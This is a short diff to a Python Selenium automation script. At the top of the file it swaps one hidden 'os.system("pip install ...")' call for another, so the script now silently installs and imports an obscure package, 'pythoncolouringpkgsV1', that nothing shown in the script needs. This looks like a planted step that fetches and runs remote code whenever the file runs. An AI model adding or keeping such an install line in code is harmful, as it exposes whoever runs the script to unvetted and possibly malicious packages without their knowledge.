@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlimodV1")
-import pipsqlimodV1
+os.system("pip install pythoncolouringpkgsV1")
+import pythoncolouringpkgsV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
